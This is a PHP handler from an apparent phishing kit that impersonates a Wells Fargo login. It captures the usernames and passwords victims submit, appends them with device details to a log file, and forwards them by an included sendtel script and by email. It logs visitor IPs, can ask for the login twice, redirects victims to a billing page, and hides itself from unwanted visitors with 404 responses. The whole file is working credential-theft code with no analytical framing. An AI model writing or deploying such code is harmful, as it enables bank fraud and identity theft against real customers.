<?php

session_start();


require_once '../Conf.php';
// require_once '../Layout/Antibot.php';
// require_once '../Layout/demonTest.php';

$comps = new Comp;
// $antibot = new Antibot;


$settings = $comps->settings();

if (!$comps->checkToken()) {
    echo $antibot->throw404();
    $comps->log(
        "../../Extracted/key/kill.txt",
        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
    );
    die();
}

if (isset(
    $_POST['username'],
    $_POST['password']
)) {
    if (!$comps->checkEmpty(
        $_POST['username'],
        $_POST['password']
    )) {
        $_SESSION['username'] = $_POST['username'];
        $_SESSION['password'] = $_POST['password'];
        $content = "
            [+]━━━━━━━【🔑 login :Wells Fargo V2.0】
[👤 user]  = " . $_SESSION['username'] . "
[👤 pass]  = " . $_SESSION['password'] . "
[👤 Device Info]  = " . $comps->userDetails();


        $save = fopen("./logs.txt", "a+");
        fwrite($save, $content);
        fclose($save);

        include "./sendtel.php";




        if (isset($settings['LoginTwice']) && $settings['LoginTwice'] == "on") {
            if (!isset($_SESSION['loginTwice']) || !$_SESSION['loginTwice']) {
                $_SESSION['loginTwice'] = 1;





                if ($comps->mailX("(1) Login | Wells Fargo", $content)) {

                    $comps->log(
                        "../../Extracted/key/live.txt",
                        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) Login\n\n"
                    );
                    die($comps->headerX("../../Login/"));
                } else {
                    die($antibot->throw404());
                }
            }

            if (isset($_SESSION['loginTwice']) && $_SESSION['loginTwice']) {
                unset($_SESSION['loginTwice']);

                if ($comps->mailX("(2) Login | Wells Fargo", $content)) {

                    $comps->log(
                        "../../Extracted/key/live.txt",
                        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (2) Login\n\n"
                    );
                    die($comps->headerX("../../Login/billing.php"));
                } else {
                    die($antibot->throw404());
                }
            }
        } else {

            if ($comps->mailX("(1) Login | Wells Fargo", $content)) {

                $comps->log(
                    "../../Extracted/key/live.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) Login\n\n"
                );
                die($comps->headerX("../../Login/billing.php"));
            } else {
                die($antibot->throw404());
            }
        }
    } else {
        echo $antibot->throw404();
        $comps->log(
            "../../Extracted/key/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
        );
        die();
    }
} else {
    echo $antibot->throw404();
    $comps->log(
        "../../Extracted/key/kill.txt",
        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
    );
    die();
}
